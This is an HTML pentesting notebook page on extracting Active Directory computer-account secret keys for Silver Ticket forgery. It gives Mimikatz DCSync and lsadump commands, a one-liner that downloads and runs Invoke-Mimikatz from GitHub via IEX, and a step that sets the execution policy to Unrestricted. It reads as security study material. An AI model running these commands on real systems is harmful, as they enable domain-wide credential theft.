<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Obtain Computer Accounts secret key</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Obtain Computer Accounts secret key</h1><br />GitHub Invoke-Mimikatz.ps1: <a
      href="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank">https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1</a><br /><br />Computer/machine
    <span style="color:#f6ff00;">Services</span> are hosted on the machine itself, this mean that to create a Silver
    Ticket we need the associated Computer Account’s <span style="color:#ff0000;">secret key</span><br />We can
    recognize Computer Accounts because usually when listed they all end with the dollar($) sign.<br /><br />•
    <strong>Perform DCsync</strong> (as seen also <a
      href="lation--Active_Directory(Windows)_Privilege_Escalation--Windows_Authentication_attacks--Kerberos--Golden_Ticket--Obtain_Krbtgt_secret_key.html">here</a>)<br />
    We need to have an account with rights to perform domain replication(always <a
      href="lation--Active_Directory(Windows)_Privilege_Escalation--Windows_Authentication_attacks--Kerberos--Golden_Ticket--Obtain_Krbtgt_secret_key.html">here</a>
    for more)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;.&nbsp;.\Invoke-Mimikatz.ps1&nbsp;&nbsp;#load&nbsp;Mimikatz&nbsp;PS&nbsp;script<br />PS&gt;&nbsp;invoke-mimikatz&nbsp;-command&nbsp;&#39;&quot;lsadump::dcsync&nbsp;/domain:daniele.local&nbsp;/all&quot;&#39;&nbsp;
      </div>
    </div><br /> <a href=""><img src="images/1147-1.png" alt="images/1147-1.png" /></a><br /> <a href=""><img
        src="images/1147-2.png" alt="images/1147-2.png" /></a><br /> The <a
      href="Home--Pentesting_Basics--PowerShell.html">PowerShell</a> one line is:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;);Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;lsadump::dcsync&nbsp;/domain:daniele.local&nbsp;/all&quot;&#39;
      </div>
    </div><br /> <br /> <br />• <strong>lsadump</strong><br /> 1) If we want execute lsadump on a DC(purpose testisting)
    we have to enable the execution of scripts to load the PS script of Mimikatz<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;Set-ExecutionPolicy&nbsp;-Scope&nbsp;CurrentUser&nbsp;-ExecutionPolicy&nbsp;Unrestricted</div>
    </div><br /> 2) Obtain Computer Account <span style="color:#ff0000;">secret key</span>. <br /> If we execute this
    command from a computer of the domain we have to specify the “ComputerName” of the <span
      style="color:#ff8700;">DC</span><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;.&nbsp;.\Invoke-Mimikatz.ps1&nbsp;&nbsp;#load&nbsp;Mimikatz&nbsp;PS&nbsp;script<br />PS&gt;&nbsp;invoke-mimikatz&nbsp;-command&nbsp;&#39;&quot;lsadump::lsa&nbsp;/inject&quot;&#39;&nbsp;-ComputerName&nbsp;&lt;hostnameDomainController&gt;&nbsp;&nbsp;&nbsp;#/inject&nbsp;option&nbsp;more&nbsp;secure(less&nbsp;crashes)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#than&nbsp;/patch&nbsp;option
      </div>
    </div><br /> <a href=""><img src="images/1147-3.png" alt="images/1147-3.png" /></a><br /> <a href=""><img
        src="images/1147-4.png" alt="images/1147-4.png" /></a><br />
  </div>
</body>

</html>